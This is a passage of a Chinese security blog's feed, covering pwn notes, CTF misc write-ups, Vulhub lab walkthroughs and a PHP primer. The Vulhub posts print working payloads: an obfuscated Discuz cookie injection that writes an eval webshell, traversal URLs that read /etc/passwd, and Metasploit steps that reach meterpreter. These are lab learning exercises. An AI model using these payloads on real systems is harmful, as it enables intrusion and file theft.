id="LibcSearcher安装"><a href="#LibcSearcher安装" class="headerlink" title="LibcSearcher安装"></a>LibcSearcher安装</h2><pre><code class="hljs">git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop</code></pre><p>一般使用方法：</p><pre><code class="hljs">libc = LibcSearcher("gets",gets_real_addr)libcbase = gets_real_addr – obj.dump("fgets")system_addr = libcbase + obj.dump("system")            #system 偏移bin_sh_addr = libcbase + obj.dump("str_bin_sh")         #/bin/sh 偏移</code></pre><p>参考：<br><a href="https://blog.csdn.net/qq_44108455/article/details/105458234">https://blog.csdn.net/qq_44108455/article/details/105458234</a></p><p><a href="https://blog.csdn.net/shanwei274/article/details/115529108">https://blog.csdn.net/shanwei274/article/details/115529108</a></p><ul><li>DynELF：pwntools中用于针对没有给libc情况的漏洞利用模块，一般用puts和write函数来泄露libc地址。</li><li>DynELF使用要求：<ul><li>漏洞可以泄露libc地址</li><li>漏洞可以反复利用</li></ul></li></ul><p>有关DynELF使用的文章：<br><a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;p&gt;拿到题目先查一下保护：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/12/05/YHz4qNbSyl</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Windows下搭建蚂蚁笔记(待补充)</title>
    <link href="https://sinky.top/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://sinky.top/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/</id>
    <published>2022-12-05T01:24:26.672Z</published>
    <updated>2022-12-05T01:41:59.971Z</updated>
    
    <content type="html"><![CDATA[<p>环境：Windows 10</p><h1 id="安装MongoDB及附带工具包"><a href="#安装MongoDB及附带工具包" class="headerlink" title="安装MongoDB及附带工具包"></a>安装MongoDB及附带工具包</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：Windows 10&lt;/p&gt;
&lt;h1 id=&quot;安装MongoDB及附带工具包&quot;&gt;&lt;a href=&quot;#安装MongoDB及附带工具包&quot; class=&quot;headerlink&quot; title=&quot;安装MongoDB及附带工具包&quot;&gt;&lt;/a&gt;安装MongoDB及附带工具包&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="搭建环境" scheme="https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
    <category term="蚂蚁笔记" scheme="https://sinky.top/tags/%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-Misc</title>
    <link href="https://sinky.top/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/"/>
    <id>https://sinky.top/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/</id>
    <published>2022-11-30T06:46:31.756Z</published>
    <updated>2022-12-01T06:03:43.156Z</updated>
    
    <content type="html"><![CDATA[<p>不想学习……所以来做几个杂项</p><h1 id="真是阳间题"><a href="#真是阳间题" class="headerlink" title="真是阳间题"></a>真是阳间题</h1><p>下载打开是一串数字，也不是十六进制，搜了一下不知道啥加密，看wp之后发现要十转十六再转文本，得到：</p><pre><code class="hljs">====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</code></pre><p>等号明显是Base，倒过来得到：</p><pre><code class="hljs">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====</code></pre><p>脚本：</p><pre><code class="hljs">str="====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI"result=str[::-1]print(result)</code></pre><p>base32解码得<code>FQARD{L0u_W0s_yp3_4_k4qrcp_0d_apwnr0}</code></p><p>还是不对，应该是移位，尝试凯撒密码，移位2，加密得：</p><pre><code class="hljs">HSCTF{N0w_Y0u_ar3_4_m4ster_0f_crypt0}</code></pre><h1 id="我们的秘密是绿色的"><a href="#我们的秘密是绿色的" class="headerlink" title="我们的秘密是绿色的"></a>我们的秘密是绿色的</h1><p>开局一张绿图，没找到隐写，看wp。</p><p>使用工具oursercert,密码是日历上的绿体字日期数字：0405111218192526</p><p>压缩包有密码，双击看到提示：</p><p><img src="https://s2.loli.net/2022/11/30/3HESYB9badDMGgl.png" alt="image.png"></p><p>搜了一下coffee的生日，啥玩意儿不对，开始爆破拿到密码：19950822</p><p><img src="https://s2.loli.net/2022/11/30/irIZQVxCjvu7GFL.png" alt="image.png"></p><p>打开看了以下txt：</p><p><img src="https://s2.loli.net/2022/11/30/NuWTbAvJMqXd5wB.png" alt="image.png"></p><p>6</p><p>打开flag，又是加密，意料之中。</p><p><img src="https://s2.loli.net/2022/11/30/O5fPrnXxiWUgZqm.png" alt="image.png"></p><p>又爆破？</p><p>试了，不行，遇事不决看wp。</p><p>明文攻击：把readme.txt压缩成zip文件，然后用ARCHPR明文攻击：</p><p><img src="https://s2.loli.net/2022/11/30/waJG7Eqj5Wdo2KV.png" alt="image.png"></p><pre><code class="hljs">Y29mZmVl</code></pre><p>打开，竟然还有一层压缩解密……这边只能单走一个6</p><p>伪加密，没碰到过，去学一下：</p><p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768" title="CTF——zip伪加密">https://blog.csdn.net/xiaozhaidada/article/details/124538768</a></p><p>我winhex过期了，懒得弄，看一下网上的分析：</p><p>把504B0304后的第3、4个byte改成0000还有把504B0102后的第5、6个byte改成0000即可破解伪加密</p><p>或者用7z也能看（我不下，那玩意太流氓了）</p><p>得到密文：<code>qddpqwnpcplen%prqwn_{_zz*d@gq}</code></p><p>栅栏密：</p><pre><code class="hljs">qwlr{ddneq_@dpnwzgpc%nzqqpp_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/ZxpkOcD2PjitIzH.png" alt="image.png"></p><p>凯撒：</p><pre><code class="hljs">flag{ssctf_@seclover%coffee_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/WAOCXHulKFnpz1R.png" alt="image.png"></p><p>这他妈谁能想到，请暴打出题人！！！！</p><h1 id="Miscellaneous-200"><a href="#Miscellaneous-200" class="headerlink" title="Miscellaneous-200"></a>Miscellaneous-200</h1><p><img src="https://s2.loli.net/2022/12/01/GzgH6NE41opeYxk.png" alt="image.png"></p><p>题目打开就是这，百度了一下有没有类似的加密方式，没找到</p><p>说实话，看到这个255，255，255.本人下意识就想到了那个RGB颜色数值，但是还是不得其解，遂看wp。</p><p>还原图片：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from ast import literal_eval<br>from PIL import Image<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'C:\\flag.txt'</span>, <span class="hljs-string">'r'</span>)<br>corl = <span class="hljs-selector-attr">[literal_eval(line) for line in f.readlines()]</span><br>f<span class="hljs-selector-class">.close</span>()<br><span class="hljs-selector-tag">img</span> = Image<span class="hljs-selector-class">.new</span>(<span class="hljs-string">'RGB'</span>, (<span class="hljs-number">270</span>, <span class="hljs-number">270</span>), <span class="hljs-string">'#ffffff'</span>)<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>   <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>      <span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.putpixel</span> (<span class="hljs-selector-attr">[i , j]</span>, corl<span class="hljs-selector-attr">[k]</span>)<br>      k=k+<span class="hljs-number">1</span><br><span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.save</span>(<span class="hljs-string">"flag.png"</span>)<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/12/01/H9yl7vRUsnrSXiB.png" alt="image.png"></p><p>这是什么扭曲的文字，嗯？</p><pre><code class="hljs">flag{ youc@n'tseeme }</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不想学习……所以来做几个杂项&lt;/p&gt;
&lt;h1 id=&quot;真是阳间题&quot;&gt;&lt;a href=&quot;#真是阳间题&quot; class=&quot;headerlink&quot; title=&quot;真是阳间题&quot;&gt;&lt;/a&gt;真是阳间题&lt;/h1&gt;&lt;p&gt;下载打开是一串数字，也不是十六进制，搜了一下不知道啥加密，看wp之后发现</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Misc" scheme="https://sinky.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub之wooyun-2010-080723</title>
    <link href="https://sinky.top/2022/11/28/vulhub%EF%BC%9Awooyun-2010-080723/"/>
    <id>https://sinky.top/2022/11/28/vulhub%EF%BC%9Awooyun-2010-080723/</id>
    <published>2022-11-28T05:49:01.650Z</published>
    <updated>2022-11-30T09:11:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>完全看不懂，所以先跟着其他文章走一遍，以后再回顾。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>由于php5.3x版本里php.ini的设置里request_order默认值为GP,导致REQUEST中不再包含_COOKIE，我们通过在cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>影响版本：<code>Discu 7.x  6.x</code></p><p>数据库地址：db</p><p>数据库名：discuz</p><p>数据库用户名及密码：root</p><p>管理员账号：admin</p><p>管理员密码：root</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>安装完成后，找一个帖子抓包，将cookie改成：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>成功执行<code>phpinfo();</code></p><p><img src="https://s2.loli.net/2022/11/28/UOwgudGJy9qZDjN.png" alt="image.png"></p><p>写入webshell，将cookie改为：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))&lt;?php @eval($_POST[pwd])?&gt;</code></pre><p><img src="https://s2.loli.net/2022/11/28/inc7KuRSVGBFC1N.png" alt="image.png"></p><p>蚁剑连接：</p><p>ip：/x.php</p><p>密码：pwd</p><p><img src="https://s2.loli.net/2022/11/28/ujskDg95xNdHbC6.png" alt="image.png"></p><p>getshell</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><ol><li>如php中的<code>system、exec、shell_exec、passthru、proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将而已系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</li><li><code>$GLOBALS</code> 引用全局作用域中可用的全部变量；关联数组array，包含当前脚本内定义成全局范围的所有变量的引用。数组的键就是变量的名字。</li><li>chr()码值表：返回值是当前整数对应的ASCII字符</li></ol><p>参考文章：</p><p><a href="https://www.cnblogs.com/cute-puli/p/13333991.html">https://www.cnblogs.com/cute-puli/p/13333991.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;完全看不懂，所以先跟着其他文章走一遍，以后再回顾。&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;由于php5.3x版本里php.ini的设置里reques</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub之 CVE-2018-3760</title>
    <link href="https://sinky.top/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/"/>
    <id>https://sinky.top/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/</id>
    <published>2022-11-25T01:49:30.605Z</published>
    <updated>2022-11-25T05:58:40.995Z</updated>
    
    <content type="html"><![CDATA[<p>先搜一下3760的形成原理：</p><p>Ruby on Rails 路径穿越；</p><p>高危；</p><p>影响版本： 版本&lt;=Sprockets 3.7.1</p><p>Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用<code>%25e%25e/</code>来跨越到就根目录，读取或执行目标服务器上任意文件。</p><p>Sprockets是一个用于编译和提供Web Assets 的Ruby库。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>目的：利用已知漏洞读取文件passwd。</p><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:///etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/buyhqXf96nOvz7L.png" alt="image.png"></p><p>直接在url后门进行文件包含，<code>/</code>被过滤，换成url编码重新访问试试：</p><pre><code class="hljs">/ 的URL编码为%2fhttp://192.168.218.145:3000/assets/file:%2f%2f/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/Bx4FSePLzYXZ8yR.png" alt="image.png"></p><p>因为<code>/etc/passwd</code>在不允许的目录中，但在报错页面给出了允许的目录列表。</p><p>随意选一个，用<code>.../.../</code>的办法向上跳转读取<code>/etc/passwd</code></p><pre><code class="hljs">" . "  url编码为%2e,二次编码为%252e</code></pre><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/xH7t5konC8ifu9h.png" alt="image.png"></p><p>参考文章</p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121845115">https://blog.csdn.net/qq_51524329/article/details/121845115</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先搜一下3760的形成原理：&lt;/p&gt;
&lt;p&gt;Ruby on Rails 路径穿越；&lt;/p&gt;
&lt;p&gt;高危；&lt;/p&gt;
&lt;p&gt;影响版本： 版本&amp;lt;=Sprockets 3.7.1&lt;/p&gt;
&lt;p&gt;Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="CVE" scheme="https://sinky.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>vulhub之CVE-2019-5418</title>
    <link href="https://sinky.top/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/"/>
    <id>https://sinky.top/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/</id>
    <published>2022-11-24T02:56:50.254Z</published>
    <updated>2022-11-25T05:58:41.004Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png" alt="image.png"></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Ruby on Rails是一个Web应用程序框架，构建在Ruby语言上。</p><p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。</p><p>通过传入<code>Accept:../../../../../../../etc/passwd\{\{</code> 头来构造路径穿越漏洞，读取任意文件。</p><h2 id="漏洞利用方法一"><a href="#漏洞利用方法一" class="headerlink" title="漏洞利用方法一"></a>漏洞利用方法一</h2><p>访问index.php（随便输入的）报错，报错页面有个<code>robots</code>路径。</p><p><img src="https://s2.loli.net/2022/11/24/ZVbqw63aJUHlmk8.png" alt="image.png"></p><p>访问一下：</p><p><img src="https://s2.loli.net/2022/11/24/8p9YzNMK2vejF64.png" alt="image.png"></p><p>不知道，抓包看看：</p><p><img src="https://s2.loli.net/2022/11/24/XRMlnKUzOFqZjNk.png" alt="image.png"></p><p>修改Accept:</p><p><img src="https://s2.loli.net/2022/11/24/VK1SO7xEFPI2kca.png" alt="image.png"></p><p>成功读取<code>/etc/passwd</code></p><h2 id="漏洞利用方法二"><a href="#漏洞利用方法二" class="headerlink" title="漏洞利用方法二"></a>漏洞利用方法二</h2><p>利用kali中的MSF进行漏洞利用</p><pre><code class="hljs">msfconsole # 启动search rails # 查找rails相关模块use 4 #选择模块</code></pre><p><img src="https://s2.loli.net/2022/11/24/siNFGewlkHa38YM.png" alt="image.png"></p><pre><code class="hljs">show options # 展示配置选项</code></pre><p><img src="https://s2.loli.net/2022/11/24/HUrDNV1AJjtawxq.png" alt="image.png"></p><p>设置Rhost,rport,route参数，直接run运行后成功拿到meterpreter。</p><p><img src="https://s2.loli.net/2022/11/24/Hy1FaMBGNERCZDb.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="CVE" scheme="https://sinky.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>php学习</title>
    <link href="https://sinky.top/2022/11/23/php%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/11/23/php%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-23T01:56:57.868Z</published>
    <updated>2023-01-06T01:26:24.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网站基本概念"><a href="#网站基本概念" class="headerlink" title="网站基本概念"></a>网站基本概念</h1><ol><li>服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）<ol><li>web服务器：提供web服务（网站访问），需要安装web服务软件，Apache,tomcat,iis等</li></ol></li><li>IP：网络互连协议，为计算机网络相互连接进行通信而设计的协议，IP地址具有唯一性（每台电脑都有一个唯一的IP地址）</li><li>域名：由遗传用点分割的名字组成（<code>www.baidu.ccom</code>）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位，一个域名的目的是便于记忆和沟通的一组服务器的地址。<ol><li>特殊IP:<code>127.0.0.1</code> 代表本机</li><li>特殊域名：<code>localhost.com</code></li></ol></li><li>DNS:域名系统，作为域名和IP地址相互映射的一个分布式数据库，使用户更方便的访问互联网，通过主机名，得到该主机名对应的IP地址的过程叫做域名解析。<ol><li><code>用户输入域名 localhost -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑</code></li></ol></li><li>端口：(port) 设备与外界通讯交流的出口，分为虚拟端口和物理端口<ol><li>虚拟端口：指计算机内部或交换机路由器内的端口，不可见，如80端口、21、23等；</li><li>物理端口：又称为接口，时可见接口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口<br> 3.<code>用户输入域名 localhost:端口 -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 -&gt; 软件（服务）</code></li></ol></li></ol><h1 id="Web程序的访问流程"><a href="#Web程序的访问流程" class="headerlink" title="Web程序的访问流程"></a>Web程序的访问流程</h1><p>web分为两类：静态网站和动态网站</p><p>浏览器发起访问-&gt; DNS解析域名-&gt; 服务器电脑-&gt; 服务软件</p><h2 id="静态网站的访问"><a href="#静态网站的访问" class="headerlink" title="静态网站的访问"></a>静态网站的访问</h2><p>访问<code>http://localhost:80/index.html</code></p><p><img src="https://s2.loli.net/2022/11/15/9Zne3TXqFwEQaxY.png" alt="image.png"></p><h2 id="动态网站访问"><a href="#动态网站访问" class="headerlink" title="动态网站访问"></a>动态网站访问</h2><p>与静态类似，但比静态多出两个内容：服务器端解析、数据库。</p><p>访问<code>http://localhost:80/index.php</code></p><p><img src="https://s2.loli.net/2022/11/15/raP1p2C7BzXuUWI.png" alt="image.png"></p><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>安个phpstudy就行了</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>php是一种运行在服务器端的脚本语言，可以嵌入到html中</p><h1 id="php代码标记"><a href="#php代码标记" class="headerlink" title="php代码标记"></a>php代码标记</h1><pre><code class="hljs">ASP标记： &lt;%php代码 %&gt; # 已弃用短标记： &lt;?php代码?&gt; # 已弃用脚本标记： &lt;script language="php"&gt;php代码&lt;/script&gt;//----------------------例子：&lt;html&gt;    &lt;body&gt;        &lt;b&gt;            &lt;script language="php"&gt;                //脚本标记                echo 'hello world';            &lt;/script&gt;        &lt;/b&gt;    &lt;/body&gt;&lt;/html&gt;//-----------------------------标准标记（常用）： &lt;?php php代码?&gt;</code></pre><h1 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h1><p>行注释： <code>//</code></p><p>块注释： <code>/*…*/</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//注释</span><br><span class="hljs-comment">/* balbala</span><br><span class="hljs-comment">balaba</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello world!"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h1 id="语句分隔符"><a href="#语句分隔符" class="headerlink" title="语句分隔符 ;"></a>语句分隔符 <code>;</code></h1><ol><li>php中标记结束符<code>?&gt;</code>有自带语句结束符效果，最后一行php代码可以没有语句结束符。</li><li>php中很多代码书写并不是嵌入到html中，而是单独存在，通常书写习惯中不建议使用标记结束符，php会自动从开始到最后全部认为是php代码。</li></ol><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>基本概念：用于存储数据，存在名字，可以通过名字访问数据，可以改变数据</p><p>php中所有变量都必须使用<code>$</code>符号。</p><p>删除变量：<code>unset()</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//变量</span><br>    <span class="hljs-comment">//定义变量：在php中不需要任何关键字定义变量(赋值)</span><br><span class="hljs-variable">$var1</span>; <span class="hljs-comment">//定义变量</span><br><span class="hljs-variable">$var2</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">//定义同时赋值</span><br><span class="hljs-comment">//访问变量</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span>;<br><span class="hljs-comment">//修改变量</span><br><span class="hljs-variable">$var2</span>=<span class="hljs-number">2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;hr/&gt;'</span>,<span class="hljs-variable">$var2</span>; <span class="hljs-comment">//hr是一个横线</span><br><span class="hljs-comment">//删除变量unset()</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$var2</span>);<br><span class="hljs-comment">//echo $var2;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h2><ol><li>在php中变量以<code>$</code>符号开始</li><li>名字由字母、数字、下划线构成，不能以数字开头</li><li>php中本身允许中文变量(不建议)</li></ol><p>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据(预定义变量都是数组)</p><pre><code class="hljs">$_GET: 获取所有表单以get方式提交的数据$_POST: POST提交的数据都会保存在此$_REQUEST: GET和POST提交的都会保存$GLOBALS: PHP中所有的全局变量$_SERVER: 服务器信息$_SESSION: session会话数据$_COOKIE: cookie会话数据$_ENV: 环境信息$_FILES: 用户上传的文件信息</code></pre><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值，在变量前面再多加一个<code>$</code>符号。</p><pre><code class="hljs">$a='b';$b='bb';echo $a;echo $$a;</code></pre><h2 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h2><p>将一个变量赋值给另外一个变量。</p><p>值传递<code>$</code>：将变量保存的值复制一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p><p>引用传递<code>&amp;</code>：将变量保存在值所在的内存地址，传递给另外一个变量，两个变量指向同一块内存空间（两个变量是同一个值）</p><p>内存分区：</p><p>栈区：程序可以操作的内存部分（不存数据，运行程序代码），少但是快</p><p>代码段：存储程序的内存部分（不执行）</p><p>数据段：存储普通数据（全局区和静态区）</p><p>堆区：存储复杂数据，大但效率低</p><pre><code class="hljs">&lt;?php    $a=10;    $b=$a;    $b=5;    echo $a,$b,'&lt;br/&gt;';    $c=10;    $d=&amp;$c;    $c=5;    echo $c,$d,'&lt;br/&gt;';?&gt;</code></pre><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>保存数据</p><p>常量：const/constant，一种在程序运行中，不可改变的量（数据）</p><p>常量定义后不可改变</p><h2 id="常量定义形式"><a href="#常量定义形式" class="headerlink" title="常量定义形式"></a>常量定义形式</h2><ol><li><p>定义常量的函数：define(‘常量名’,常量值);</p></li><li><p>const常量名</p><p> define(‘PI’,3.14);<br> const PII=3;</p></li></ol><h2 id="常量的命名规则"><a href="#常量的命名规则" class="headerlink" title="常量的命名规则"></a>常量的命名规则</h2><ol><li>不需要$</li><li>由字母、数字、下划线组成，不能以数字开头</li><li>通常都是大写字母，不区分大小写，但是要跟变量区分开</li><li>特殊常量只能用define定义</li></ol><h2 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h2><pre><code class="hljs">PHP_VERSION # php版本号PHP_INT_SIZE # 整型大小PHP_INT-MAX # 整型能表示的最大值（允许出现负数：带符号）</code></pre><p>系统魔术常量：</p><pre><code class="hljs">__常量名__</code></pre><p>魔术常量值通常会跟着环境变化，但用户改变不了</p><pre><code class="hljs">__DIR__ # 当前被执行的脚本所在的绝对路径__FILE__ # 当前被执行的脚本所在的绝对路径__LINE__ # 当前所属的行数__NAMESPACE__ # 当前所属的命名空间__CLASS__ # 当前所属的类__METHOD__ # 当前所属的方法</code></pre><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><pre><code class="hljs">data type </code></pre><p>在php中指的是存储的数据本身的类型，而不是变量的类型。php是一种弱类型语言，变量本身没有数据类型。</p><h2 id="八种数据类型"><a href="#八种数据类型" class="headerlink" title="八种数据类型"></a>八种数据类型</h2><ul><li>基本数据类型：<ul><li>整型：int/integer，系统分配4个字节存储，表整数类型</li><li>浮点型：float/double，系统分配8个字节存储，表小数或整型存不下的整数</li><li>字符串型：string，系统根据实际长度分配，表示字符串(引号)</li><li>布尔类型：bool/boolean，表布尔类型</li></ul></li><li>复合数据类型：<ul><li>对象类型：object，存放对象</li><li>数组类型：array，存储多个数据（一次性）</li></ul></li><li>特殊数据类型<ul><li>资源类型：resource，存放资源数据（php外部数据，如数据库、文件）</li><li>空类型：NULL，只有一个值就是NULL(不能运算)</li></ul></li></ul><h2 id="类型转换"><a href="#类型转换" class="headerlink" 